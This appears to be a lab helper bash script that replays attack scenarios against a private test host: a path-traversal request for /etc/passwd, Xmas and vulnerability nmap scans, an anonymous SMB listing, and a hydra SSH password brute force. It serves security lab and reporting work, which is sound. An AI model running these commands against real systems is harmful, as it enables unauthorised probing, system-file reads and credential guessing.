#!/usr/bin/env bash
set -euo pipefail

# Reconstructed scenarios for the isolated report lab. Select one explicitly.
case "${1:-}" in
    http)
        curl --path-as-is --max-time 10 'http://192.168.50.20/../../../../etc/passwd'
        ;;
    xmas)
        sudo nmap -sX -p 22,80,445 192.168.50.20
        ;;
    smb)
        smbclient -L //192.168.50.20 -N -m SMB3
        ;;
    nmap)
        nmap -sV --script vuln 192.168.50.20
        ;;
    ssh)
        : "${LAB_USER:?Set LAB_USER to a dedicated lab account}"
        : "${PASSWORD_LIST:?Set PASSWORD_LIST to a small local lab password file}"
        test -r "$PASSWORD_LIST"
        hydra -t 1 -f -l "$LAB_USER" -P "$PASSWORD_LIST" ssh://192.168.50.20
        ;;
    *)
        echo 'Usage: bash scripts/attack_commands.sh {http|xmas|smb|nmap|ssh}'
        ;;
esac
